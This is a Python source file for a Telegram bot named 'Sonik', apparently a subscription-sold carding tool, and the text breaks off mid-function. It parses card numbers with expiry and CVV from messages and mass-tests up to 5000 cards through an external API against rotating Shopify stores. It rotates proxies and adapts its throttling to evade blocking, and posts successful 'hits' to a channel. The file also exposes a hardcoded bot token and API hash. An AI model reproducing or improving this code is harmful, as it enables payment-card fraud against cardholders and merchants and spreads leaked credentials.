# SONIK MAIN BOT - ULTIMATE STABLE VERSION WITH ADAPTIVE PROTECTION
# =================================================================
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import logging
import string
from datetime import datetime, timezone, timedelta
from urllib.parse import quote
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji, ChannelParticipantBanned
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.extensions import html as thtml
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
from database import (
    init_db, db,
    ensure_user, get_user_subscription, set_user_subscription, is_user_subscribed,
    is_banned_user, ban_user, unban_user, get_all_users, update_last_seen,
    add_proxy_db, get_all_user_proxies, get_proxy_count, get_random_proxy,
    remove_proxy_by_index, remove_proxy_by_url, clear_all_proxies,
    save_card_to_db, get_total_cards_count, get_charged_count, get_approved_count,
    get_total_users, get_premium_count, cleanup_expired_subscriptions,
    get_global_sites, add_global_site, add_global_sites_batch, remove_global_site, clear_all_global_sites, get_total_sites_count
)
API_ID = 38208016
API_HASH = '0d52125034b6a0d0dac3e71b40cea032'
BOT_TOKEN = '8658304242:AAHESjFvC1z29q89qHneXckMiqvtFMHxwyQ'
ADMIN_ID = [1093032296, 7077116674]
HIT_CHANNEL_ID = -1002635018188
JOIN_GROUP_ID = -1002635018188
JOIN_CHANNEL_ID = -1002635018188
JOIN_GROUP_LINK = "https://t.me/ReGict7"
JOIN_CHANNEL_LINK = "https://t.me/ReGict7"
API_BASE_URL = "https://apibeta-production-fefd.up.railway.app/shopify"
PAYMENT_BOT_USERNAME = "Stars838bot"
SP_PER_USER_WORKERS = 60
MSP_PER_USER_WORKERS = 60
SITE_PER_USER_WORKERS = 50
PROXY_PER_USER_WORKERS = 80
BIN_WORKERS = 30
API_TIMEOUT = 120
BIN_TIMEOUT = 60
PROXY_TIMEOUT = 8
PROXY_CHECK_BATCH = 50
HIT_DELAY = 1.5
MAX_CARDS_MASS = 5000
CODE_EXPIRY_HOURS = 24
client = TelegramClient('sonik_main', API_ID, API_HASH)
client_instance = client
_USER_SEMS = {}
_BIN_SEM = asyncio.Semaphore(BIN_WORKERS)
_BIN_CACHE = {}
_BIN_CACHE_TIME = {}
_BIN_CACHE_TTL = 3600
REJECTED_GATEWAYS = [
    'authorize.net',
    'authorize',
    'checkout.com',
    'checkout',
    'Checkout.com - Onsite Payments',
    'stripe',
    'stripe card payments',
    'Stripe Card Payments',
    'braintree',
    'square',
    'adyen',
    'payoneer',
    'session id',
    'session_id',
    'http_503',
    '503 service unavailable'
]
ACCEPTED_RESPONSES = [
    '3ds_required',
    'insufficient_funds',
    'card_declined',
    'order_paid',
    'charged',
    'payment successful'
]
REJECTED_RESPONSES = [
    'empty submit response',
    'empty submit',
    'no valid payment method',
    'no valid payment method found',
    'unable to get payment token',
    'cart failed with status 429',
    'cart failed with status 503',
    'could not extract session id',
    'session id',
    'http_503',
    '503 service unavailable',
    'checkout token not found',
    'checkout token is empty'
]
PRICE_RANGES = {
    "1": {"name": "0.01-5 USD", "min": 0.01, "max": 5},
    "2": {"name": "0.01-10 USD", "min": 0.01, "max": 10},
    "3": {"name": "0.01-20 USD", "min": 0.01, "max": 20},
    "4": {"name": "0.01-40 USD", "min": 0.01, "max": 40},
    "5": {"name": "5-10 USD", "min": 5, "max": 10},
    "6": {"name": "5-20 USD", "min": 5, "max": 20},
    "7": {"name": "10-20 USD", "min": 10, "max": 20},
    "8": {"name": "20-40 USD", "min": 20, "max": 40},
}
class AdaptiveThrottler:
    def __init__(self, min_delay=0.01, max_delay=0.5):
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.current_delay = min_delay
        self.error_count = 0
        self.success_count = 0
        self.last_adjust = time.time()
        self.flood_detected = False
        self.recovery_until = 0
    async def wait(self):
        if self.flood_detected and time.time() < self.recovery_until:
            await asyncio.sleep(0.5)
            return
        await asyncio.sleep(self.current_delay)
        if time.time() - self.last_adjust > 10:
            if self.error_count > self.success_count * 0.5:
                self.current_delay = min(self.current_delay * 1.3, self.max_delay)
            elif self.success_count > self.error_count * 2 and self.current_delay > self.min_delay:
                self.current_delay = max(self.current_delay * 0.9, self.min_delay)
            self.error_count = 0
            self.success_count = 0
            self.last_adjust = time.time()
    def report_success(self):
        self.success_count += 1
    def report_error(self):
        self.error_count += 1
    def report_flood(self, wait_seconds):
        self.flood_detected = True
        self.recovery_until = time.time() + wait_seconds + 5
        self.current_delay = min(self.current_delay * 1.5, self.max_delay)
    def is_recovering(self):
        if self.flood_detected and time.time() < self.recovery_until:
            return True
        if self.flood_detected:
            self.flood_detected = False
        return False
GLOBAL_THROTTLER = AdaptiveThrottler(min_delay=0.002, max_delay=1.0)
class SessionPool:
    def __init__(self, pool_size=30):
        self.pool_size = pool_size
        self.sessions = []
        self.current_index = 0
        self._lock = asyncio.Lock()
    async def get_session(self):
        async with self._lock:
            if not self.sessions:
                for _ in range(self.pool_size):
                    connector = aiohttp.TCPConnector(
                        limit=400,
                        limit_per_host=100,
                        force_close=True,
                        enable_cleanup_closed=True,
                        ttl_dns_cache=300
                    )
                    session = aiohttp.ClientSession(
                        timeout=aiohttp.ClientTimeout(total=API_TIMEOUT, connect=5),
                        connector=connector,
                    )
                    self.sessions.append(session)
            session = self.sessions[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.sessions)
            return session
SESSION_POOL = SessionPool(pool_size=100)
class CircuitBreaker:
    def __init__(self, failure_threshold=8, recovery_time=20):
        self.failure_threshold = failure_threshold
        self.recovery_time = recovery_time
        self.failures = 0
        self.last_failure = 0
        self.state = "CLOSED"
    async def call(self, func, *args, **kwargs):
        if self.state == "OPEN":
            if time.time() - self.last_failure > self.recovery_time:
                self.state = "HALF_OPEN"
            else:
                raise Exception("Circuit Breaker OPEN")
        try:
            result = await func(*args, **kwargs)
            if self.state == "HALF_OPEN":
                self.state = "CLOSED"
                self.failures = 0
            return result
        except FloodWaitError as e:
            self.failures += 1
            self.last_failure = time.time()
            if self.failures >= self.failure_threshold:
                self.state = "OPEN"
            raise e
        except Exception as e:
            self.failures += 1
            self.last_failure = time.time()
            if self.failures >= self.failure_threshold:
                self.state = "OPEN"
            raise e
API_CIRCUIT = CircuitBreaker(failure_threshold=6, recovery_time=15)
class ResultCache:
    def __init__(self, ttl=60):
        self.cache = {}
        self.ttl = ttl
    def get(self, key):
        if key in self.cache:
            value, timestamp = self.cache[key]
            if time.time() - timestamp < self.ttl:
                return value
            del self.cache[key]
        return None
    def set(self, key, value):
        self.cache[key] = (value, time.time())
RESULT_CACHE = ResultCache(ttl=60)
class ProxyPoolManager:
    def __init__(self):
        self.proxies = []
        self.fail_counts = {}
        self.current_index = 0
        self.last_rotation = time.time()
        self.rotation_interval = 3
    def update_proxies(self, proxies):
        self.proxies = proxies
        self.fail_counts = {}
    def get_next_proxy(self):
        if not self.proxies:
            return None
        if time.time() - self.last_rotation > self.rotation_interval:
            self.current_index = (self.current_index + 1) % len(self.proxies)
            self.last_rotation = time.time()
        for _ in range(len(self.proxies)):
            proxy = self.proxies[self.current_index]
            proxy_url = proxy.get('proxy_url')
            if self.fail_counts.get(proxy_url, 0) < 3:
                return proxy
            self.current_index = (self.current_index + 1) % len(self.proxies)
        self.fail_counts = {}
        return self.proxies[self.current_index % len(self.proxies)]
PROXY_MANAGER = ProxyPoolManager()
class HealthMonitor:
    def __init__(self):
        self.is_healthy = True
        self.last_check = time.time()
        self.consecutive_failures = 0
    async def check_health(self):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.telegram.org", timeout=5) as resp:
                    if resp.status == 200:
                        self.consecutive_failures = 0
                        self.is_healthy = True
                        return True
                    else:
                        self.consecutive_failures += 1
                        if self.consecutive_failures > 3:
                            self.is_healthy = False
                        return False
        except:
            self.consecutive_failures += 1
            if self.consecutive_failures > 3:
                self.is_healthy = False
            return False
    def is_server_healthy(self):
        return self.is_healthy
HEALTH_MONITOR = HealthMonitor()
async def call_with_retry(func, max_retries=5, base_delay=0.1):
    last_exception = None
    for attempt in range(max_retries):
        try:
            return await func()
        except FloodWaitError as e:
            wait_time = e.seconds + (attempt * 2) + 1
            GLOBAL_THROTTLER.report_flood(wait_time)
            log_system("FLOOD", f"Flood wait {wait_time}s (attempt {attempt+1}/{max_retries})", "warning")
            await asyncio.sleep(wait_time)
            if attempt == max_retries - 1:
                raise
        except (aiohttp.ClientError, asyncio.TimeoutError, ConnectionError) as e:
            last_exception = e
            wait_time = base_delay * (2 ** attempt) + random.uniform(0, 0.2)
            log_system("RETRY", f"Request failed, retrying in {wait_time:.2f}s (attempt {attempt+1}/{max_retries})", "warning")
            GLOBAL_THROTTLER.report_error()
            await asyncio.sleep(wait_time)
            if attempt == max_retries - 1:
                raise
        except Exception as e:
            if "connection" in str(e).lower() or "timeout" in str(e).lower():
                wait_time = base_delay * (2 ** attempt)
                await asyncio.sleep(wait_time)
                if attempt == max_retries - 1:
                    raise
            else:
                raise
    if last_exception:
        raise last_exception
    return None
async def safe_api_call(func, *args, **kwargs):
    if HEALTH_MONITOR.is_server_healthy() == False:
        await asyncio.sleep(0.3)
    if GLOBAL_THROTTLER.is_recovering():
        await asyncio.sleep(0.5)
    await GLOBAL_THROTTLER.wait()
    try:
        result = await API_CIRCUIT.call(call_with_retry, lambda: func(*args, **kwargs))
        GLOBAL_THROTTLER.report_success()
        return result
    except FloodWaitError as e:
        GLOBAL_THROTTLER.report_flood(e.seconds)
        raise
    except Exception as e:
        GLOBAL_THROTTLER.report_error()
        raise
def get_user_sem(uid, sem_type="msp"):
    key = f"{uid}_{sem_type}"
    if key not in _USER_SEMS:
        limits = {
            "sp": SP_PER_USER_WORKERS,
            "msp": MSP_PER_USER_WORKERS,
            "site": SITE_PER_USER_WORKERS,
            "proxy": PROXY_PER_USER_WORKERS,
        }
        _USER_SEMS[key] = asyncio.Semaphore(limits.get(sem_type, 30))
    return _USER_SEMS[key]
def cleanup_user_sem(uid):
    keys_to_remove = [k for k in _USER_SEMS if k.startswith(f"{uid}_")]
    for k in keys_to_remove:
        del _USER_SEMS[k]
CE = {
    "crown": 5039727497143387500, "bolt": 5042334757040423886,
    "brain": 5040030395416969985, "shield": 5042328396193864923,
    "star": 5042176294222037888, "gem": 5042050649248760772,
    "check": 5039793437776282663, "fire": 5039644681583985437,
    "party": 5039778134807806727, "search": 5039649904264217620,
    "chart": 5042290883949495533, "pin": 5039600026809009149,
    "joker": 5039998939076494446, "plus": 5039891861246838069,
    "cross": 5040042498634810056, "info": 5042306247047513767,
    "gift": 5041975203853239332, "eyes": 5039623284056917259,
    "trash": 5039614900280754969, "tick": 5039844895779455925,
    "stop": 5039671744172917707, "warn": 5039665997506675838,
    "link": 5042101437237036298, "globe": 5042186567783809934,
    "restart": 5413554170668032766, "online": 5413813953685923984,
    "declined": 4956612582816351459,
    "fire_premium": 5039644681583985437,
    "heart_fire": 5039968412613214223,
    "cool": 5042202682316554526,
    "sled": 5041857106060247653,
    "wine": 5039778134807806727,
    "diamond": 5042050649248760772,
    "snowman": 5041926210087545422,
    "trophy": 5042334757040423886,
    "rocket": 5042176294222037888,
    "money": 5042050649248760772,
    "chart_up": 5042290883949495533,
    "bell": 5039600026809009149,
    "telegram_emoji_1": 5042334757040423886, # Placeholder, replace with actual ID
    "telegram_emoji_2": 5040030395416969985, # Placeholder, replace with actual ID
    "hit_channel_emoji": 5042176294222037888  # Placeholder, replace with actual ID
}
PE = "⭐"
def gemj(emoji_name, for_button=False):
    emoji_id = CE.get(emoji_name)
    fallback = {
        "fire_premium": "⚡️", "heart_fire": "❤️‍🔥", "cool": "🆒",
        "sled": "🛷", "wine": "🥂", "diamond": "💎", "snowman": "☃️",
        "fire": "🔥", "check": "✅", "declined": "❌", "cross": "⚠️",
        "rocket": "🚀", "hit_channel_emoji": "❤️‍🔥"
    }
    fb = fallback.get(emoji_name, "⭐")
    if emoji_id and not for_button:
        return f'<tg-emoji emoji-id="{emoji_id}">{fb}</tg-emoji>'
    return fb
ACTIVE_MTXT_PROCESSES = {}
PENDING_ADD_SITES = {}
USER_APPROVED_PREF = {}
MAINTENANCE_FILE = "maintenance.json"
_MAINTENANCE_CACHE = {"enabled": None, "last_check": 0}
_JOIN_CACHE = {}
BOT_START_TIME = time.time()
MAIN_BOT_USERNAME = None
_USER_HTTP_SESSIONS = {}
_GLOBAL_BIN_SESSION = None
_GLOBAL_PROXY_SESSION = None
log = logging.getLogger("Sonik")
log.setLevel(logging.INFO)
_log_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler()
_ch.setLevel(logging.INFO)
_ch.setFormatter(_log_fmt)
log.addHandler(_ch)
try:
    _fh = logging.FileHandler('sonik_bot.log', encoding='utf-8')
    _fh.setLevel(logging.INFO)
    _fh.setFormatter(_log_fmt)
    log.addHandler(_fh)
except:
    pass
def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")
def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")
_BOLD_SANS_MAP = {}
_normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
_normal_lower = "abcdefghijklmnopqrstuvwxyz"
_normal_digits = "0123456789"
_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"
for _i, _c in enumerate(_normal_upper):
    _BOLD_SANS_MAP[_c] = _bold_upper[_i]
for _i, _c in enumerate(_normal_lower):
    _BOLD_SANS_MAP[_c] = _bold_lower[_i]
for _i, _c in enumerate(_normal_digits):
    _BOLD_SANS_MAP[_c] = _bold_digits[_i]
def bs(text):
    if not text:
        return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))
async def get_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.get(key)
    if session is None or session.closed:
        connector = aiohttp.TCPConnector(
            limit=250, limit_per_host=75, ttl_dns_cache=300,
            use_dns_cache=True, keepalive_timeout=30, enable_cleanup_closed=True,
        )
        session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=API_TIMEOUT, connect=10),
            connector=connector,
        )
        _USER_HTTP_SESSIONS[key] = session
    return session
async def cleanup_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try:
            await session.close()
        except:
            pass
async def get_bin_session():
    global _GLOBAL_BIN_SESSION
    if _GLOBAL_BIN_SESSION is None or _GLOBAL_BIN_SESSION.closed:
        connector = aiohttp.TCPConnector(limit=150, limit_per_host=50)
        _GLOBAL_BIN_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=BIN_TIMEOUT, connect=5),
            connector=connector
        )
    return _GLOBAL_BIN_SESSION
async def get_proxy_session():
    global _GLOBAL_PROXY_SESSION
    if _GLOBAL_PROXY_SESSION is None or _GLOBAL_PROXY_SESSION.closed:
        connector = aiohttp.TCPConnector(limit=300, limit_per_host=100)
        _GLOBAL_PROXY_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=8),
            connector=connector
        )
    return _GLOBAL_PROXY_SESSION
def generate_code(length=8):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choices(chars, k=length))
async def create_subscription_code(admin_id, hours):
    code = generate_code()
    expiry = datetime.now(timezone.utc) + timedelta(hours=CODE_EXPIRY_HOURS)
    code_data = {
        "code": code,
        "hours": hours,
        "created_by": admin_id,
        "created_at": datetime.now(timezone.utc),
        "expires_at": expiry,
        "used": False,
        "used_by": None,
        "used_at": None
    }
    await db["codes"].insert_one(code_data)
    return code
async def redeem_code(user_id, code):
    code_data = await db["codes"].find_one({"code": code.upper()})
    if not code_data:
        return {"success": False, "message": "Invalid code"}
    if code_data.get("used", False):
        return {"success": False, "message": "Code already used"}
    expires_at = code_data.get("expires_at")
    if expires_at:
        if expires_at.tzinfo is None:
            expires_at = expires_at.replace(tzinfo=timezone.utc)
        if expires_at < datetime.now(timezone.utc):
            return {"success": False, "message": "Code expired"}
    if await is_user_subscribed(user_id):
        return {"success": False, "message": "You already have an active subscription"}
    await db["codes"].update_one(
        {"code": code.upper()},
        {"$set": {
            "used": True,
            "used_by": user_id,
            "used_at": datetime.now(timezone.utc)
        }}
    )
    hours = code_data.get("hours", 1)
    await set_user_subscription(user_id, "code_redeem", hours)
    return {
        "success": True,
        "message": f"Subscription added! {hours} hours",
        "hours": hours
    }
async def get_code_info(code):
    return await db["codes"].find_one({"code": code.upper()})
class SmartRotator:
    def __init__(self):
        self._site_fails = {}
        self._proxy_fails = {}
        self._site_idx = 0
        self._proxy_idx = 0
    def pick_site(self, sites, exclude=None):
        if not sites:
            return None
        exclude = exclude or set()
        available = [s for s in sites if s not in exclude and self._site_fails.get(s, 0) < 5]
        if not available:
            available = [s for s in sites if s not in exclude]
        if not available:
            available = list(sites)
        self._site_idx = (self._site_idx + 1) % len(available)
        return available[self._site_idx]
    def pick_proxy(self, proxies, exclude=None):
        if not proxies:
            return None
        exclude = exclude or set()
        available = [p for p in proxies if p.get('proxy_url') not in exclude and self._proxy_fails.get(p.get('proxy_url'), 0) < 5]
        if not available:
            available = [p for p in proxies if p.get('proxy_url') not in exclude]
        if not available:
            available = list(proxies)
        self._proxy_idx = (self._proxy_idx + 1) % len(available)
        return available[self._proxy_idx]
    def report_site_ok(self, site):
        self._site_fails[site] = 0
    def report_site_fail(self, site):
        self._site_fails[site] = self._site_fails.get(site, 0) + 1
    def report_proxy_ok(self, proxy_url):
        if proxy_url:
            self._proxy_fails[proxy_url] = 0
    def report_proxy_fail(self, proxy_url):
        if proxy_url:
            self._proxy_fails[proxy_url] = self._proxy_fails.get(proxy_url, 0) + 1
SITE_ERROR_KEYWORDS = [
    'r4 token empty', 'payment method is not shopify', 'r2 id empty',
    'site requires login', 'failed to get token', 'no valid products', 'not shopify',
    'failed to get checkout', 'failed to detect product', 'failed to create checkout',
    'failed to get proposal data', 'site not supported', 'site error! status: 429',
    'token not found', 'handle is empty', 'payment method identifier is empty',
    'failed to get session token', 'failed to tokenize card', 'no_session_token',
    'no session token', 'no checkout token found', 'checkout token not found',
    'no checkout token', 'checkout token is empty', 'tokenize_fail', 'tax ammount empty',
    'tax amount empty', 'del ammount empty', 'site not supported for now',
    'payment base card not supported', 'no product found', 'checkout is not available',
    'cart is empty', 'checkout_expired', 'checkout_not_found', 'no shipping methods available',
    'site error', 'site dead', 'server error', 'internal server error', 'timeout',
    'connection error', 'connection failed', 'timed out', 'cloudflare', 'access denied',
    'bad gateway', 'service unavailable', 'gateway timeout',
    'empty submit response',
    'empty submit',
    'no valid payment method',
    'no valid payment method found',
    'unable to get payment token',
    'cart failed with status 429',
    'cart failed with status 503',
    'could not extract session id',
    'session id',
    'http_503',
    '503 service unavailable',
]
PROXY_ERROR_KEYWORDS = ['proxy dead', 'proxy error', 'proxy timeout', 'proxy connection failed']
def is_site_error(text):
    if not text:
        return True
    lower = text.lower().strip()
    return any(kw in lower for kw in SITE_ERROR_KEYWORDS) or lower == 'na'
def is_proxy_error(text):
    if not text:
        return False
    return any(kw in text.lower().strip() for kw in PROXY_ERROR_KEYWORDS)
def normalize_site_url(url):
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url)
    url = url.rstrip('/')
    if url.startswith('www.'):
        url = url[4:]
    if '/' in url:
        url = url.split('/')[0]
    return url
async def detect_payment_gateway(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', test_card, proxy_data)
        s = http_session or (await get_user_http_session(0, "site"))
        async with s.get(url, timeout=30) as resp:
            if resp.status != 200:
                return 'dead'
            try:
                raw = await resp.json(content_type=None)
            except:
                return 'unknown'
            rm = str(raw.get('Response', '')).lower()
            gw = str(raw.get('Gate', raw.get('Gateway', ''))).lower()
            for rejected in REJECTED_RESPONSES:
                if rejected in rm:
                    return 'dead'
            is_accepted = False
            for accepted in ACCEPTED_RESPONSES:
                if accepted in rm:
                    is_accepted = True
                    break
            if not is_accepted:
                return 'dead'
            if any(rj.lower() in gw for rj in REJECTED_GATEWAYS):
                return 'rejected_gateway'
            if 'shopify' in gw:
                return 'shopify'
            if is_site_error(rm):
                return 'dead'
            if gw and gw != '' and gw != 'unknown':
                return gw
            if rm and not is_site_error(rm):
                return 'shopify'
            return 'unknown'
    except:
        return 'error'
async def get_site_product_price(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', test_card, proxy_data)
        s = http_session or (await get_user_http_session(0, "site"))
        async with s.get(url, timeout=30) as resp:
            if resp.status != 200:
                return None
            try:
                raw = await resp.json(content_type=None)
            except:
                return None
            price = raw.get('Price', '-')
            if price and price != '-':
                try:
                    price_str = str(price).replace('$', '').replace(',', '').strip()
                    price_val = float(price_str)
                    if price_val >= 0:
                        return round(price_val, 2)
                except:
                    pass
            return None
    except:
        return None
async def verify_site_full(site, proxy_data=None, http_session=None, max_retries=1):
    try:
        gateway = await detect_payment_gateway(site, proxy_data, http_session)
        price = await get_site_product_price(site, proxy_data, http_session)
        gw_lower = str(gateway).lower()
        if gateway == 'rejected_gateway':
            return {
                'site': site,
                'status': 'rejected',
                'reason': f'Rejected gateway: {gateway}',
                'gateway': gateway,
                'price': None
            }
        if gateway == 'dead' or gateway == 'unknown' or gateway == 'error':
            return {
                'site': site,
                'status': 'rejected',
                'reason': f'Gateway detection failed: {gateway}',
                'gateway': gateway,
                'price': None
            }
        if price is not None and price < 0.01:
            price = None
        return {
            'site': site,
            'status': 'alive',
            'gateway': gateway,
            'price': price,
            'price_val': price if price else 999.0,
            'reason': None
        }
    except Exception as e:
        return {
            'site': site,
            'status': 'error',
            'reason': str(e)[:50],
            'gateway': 'unknown',
            'price': None
        }
def build_entities(html_text, emoji_ids=None):
    try:
        # 1. Extract all <tg-emoji emoji-id="ID">Placeholder</tg-emoji>
        # and replace with PE, while storing IDs to handle them manually
        found_ids = []
        def replace_emoji(match):
            try:
                found_ids.append(int(match.group(1)))
                return PE
            except:
                return match.group(0)
        
        # Use a temporary placeholder that won't be confused with HTML tags
        cleaned_html = re.sub(r'<tg-emoji emoji-id="(\d+)">(.*?)</tg-emoji>', replace_emoji, html_text)
        
        # 2. Parse the remaining standard HTML (<b>, <i>, <code>, etc.)
        text, entities = thtml.parse(cleaned_html)
        
        # 3. Combine IDs from tags and any explicitly passed emoji_ids
        all_emoji_ids = found_ids + (emoji_ids or [])
        
        # 4. Map the IDs to the PE placeholder positions in the final text
        if all_emoji_ids:
            idx, utf16_pos = 0, 0
            # Calculate UTF-16 offsets for each character in the text
            for ch in text:
                if ch == PE and idx < len(all_emoji_ids):
                    try:
                        # Only add if no entity exists at this offset to avoid duplicates
                        if not any(isinstance(e, MessageEntityCustomEmoji) and e.offset == utf16_pos for e in entities):
                            entities.append(MessageEntityCustomEmoji(offset=utf16_pos, length=1, document_id=all_emoji_ids[idx]))
                            idx += 1
                    except:
                        pass
                # Handle UTF-16 surrogate pairs for correct offset calculation
                # Telethon/Telegram uses UTF-16 offsets
                utf16_pos += 2 if ord(ch) > 0xFFFF else 1
        
        return text, sorted(entities, key=lambda e: e.offset)
    except Exception as e:
        log_system("BUILD_ENTITIES", f"Error: {e}", "error")
        return html_text, []
async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            event.reply(text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
            timeout=15
        )
    except:
        try:
            # Fallback to HTML parse mode if entity building fails
            return await asyncio.wait_for(
                event.reply(html_text[:4000], parse_mode='html', buttons=buttons, file=file, link_preview=False),
                timeout=10
            )
        except:
            return None
async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            client_instance.send_message(chat_id, text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
            timeout=15
        )
    except Exception as e:
        try:
            # Fallback to HTML parse mode if entity building fails
            return await client_instance.send_message(chat_id, html_text, buttons=buttons, file=file, parse_mode='html', link_preview=False)
        except:
            return None
async def styled_edit(event, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await event.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False)
    except Exception as e:
        try:
            return await event.edit(html_text, buttons=buttons, parse_mode='html', link_preview=False)
        except:
            clean_text = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', html_text)
            clean_text = clean_text.replace('<b>', '').replace('</b>', '').replace('<i>', '').replace('</i>', '').replace('<code>', '').replace('</code>', '')
            try:
                return await event.edit(clean_text, buttons=buttons)
            except:
                return None
def pbtn(text, data=None, url=None, style=None):
    if url:
        return Button.url(text, url)
    if data:
        return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")
async def is_user_joined(user_id):
    if user_id in ADMIN_ID:
        return True
    now = time.time()
    cached = _JOIN_CACHE.get(user_id)
    if cached and now - cached < 600:
        return True
    for cid in [JOIN_GROUP_ID, JOIN_CHANNEL_ID]:
        try:
            r = await client(GetParticipantRequest(channel=cid, participant=user_id))
            if isinstance(r.participant, ChannelParticipantBanned):
                return False
        except UserNotParticipantError:
            return False
        except:
            pass
    _JOIN_CACHE[user_id] = now
    return True
async def force_join_check(event):
    if event.sender_id in ADMIN_ID:
        return True
    if await is_user_joined(event.sender_id):
        return True
    _JOIN_CACHE.pop(event.sender_id, None)
    buttons = [
        [pbtn("🔗 " + bs("Join Channel"), url=JOIN_CHANNEL_LINK)],
        [pbtn("✅ " + bs("I have joined"), data="check_joined")]
    ]
    text = f"""🔒 <b>{bs('Access Locked')}</b> 🔒
<b>━━━━━━━━━━━━━━━━━</b>
⭐ <b>{bs('Join to Unlock')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
📢 <b>{bs('Channel')}:</b> <i>{bs('ReGict7')}</i>
<b>━━━━━━━━━━━━━━━━━</b>"""
    await styled_reply(event, text, buttons=buttons, emoji_ids=[CE["fire"], CE["fire"], CE["stop"], CE["link"]])
    return False
async def set_maintenance_mode(enabled):
    global _MAINTENANCE_CACHE
    try:
        async with aiofiles.open(MAINTENANCE_FILE, "w") as f:
            await f.write(json.dumps({"maintenance": enabled}))
        _MAINTENANCE_CACHE = {"enabled": enabled, "last_check": time.time()}
    except:
        pass
async def get_maintenance_mode():
    global _MAINTENANCE_CACHE
    now = time.time()
    if _MAINTENANCE_CACHE["enabled"] is not None and now - _MAINTENANCE_CACHE["last_check"] < 30:
        return _MAINTENANCE_CACHE["enabled"]
    try:
        if not os.path.exists(MAINTENANCE_FILE):
            return False
        async with aiofiles.open(MAINTENANCE_FILE, "r") as f:
            data = json.loads(await f.read())
            _MAINTENANCE_CACHE = {"enabled": data.get("maintenance", False), "last_check": now}
            return _MAINTENANCE_CACHE["enabled"]
    except:
        return False
async def check_maintenance(event):
    if await get_maintenance_mode() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, f"""🔧 <b>{bs('Maintenance')}</b> 🔧
<b>━━━━━━━━━━━━━━━━━</b>
⚠️ <b>{bs('Bot under maintenance')}</b>
⏳ <i>{bs('Try again later')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])
        return True
    return False
async def can_use(user_id, chat):
    await ensure_user(user_id)
    if await is_banned_user(user_id):
        return False, "banned"
    sub = await get_user_subscription(user_id)
    if sub["is_active"] or user_id in ADMIN_ID:
        return True, f"{sub['plan'] if sub['is_active'] else 'Admin'}_private"
    return False, "no_subscription"
async def require_subscription(event):
    uid = event.sender_id
    if uid in ADMIN_ID:
        return True
    if await is_banned_user(uid):
        t, e = banned_user_message()
        await styled_reply(event, t, emoji_ids=e)
        return False
    if await is_user_subscribed(uid):
        return True
    await send_no_subscription_message(event)
    return False
async def send_no_subscription_message(event):
    text = f"""🚫 <b>{bs('Access Denied')}</b> 🚫
<b>━━━━━━━━━━━━━━━━━</b>
⚠️ <b>{bs('No Active Subscription')}</b>
💡 <i>{bs('Subscribe using the payment bot:')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>@{PAYMENT_BOT_USERNAME}</b>
📝 <code>/subscribe</code> {bs('to buy a plan')}"""
    await styled_reply(event, text, emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"], CE["link"]])
def banned_user_message():
    return f"""🚫 <b>{bs('Banned')}</b> 🚫
<b>━━━━━━━━━━━━━━━━━</b>
⛔ <b>{bs('You are banned from using Sonik')}</b>
📞 <b>{bs('Appeal')}:</b> <i>{bs('Contact Admin')}</i>""", [CE["stop"], CE["stop"], CE["warn"], CE["info"]]
def extract_cc(text):
    if not text:
        return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
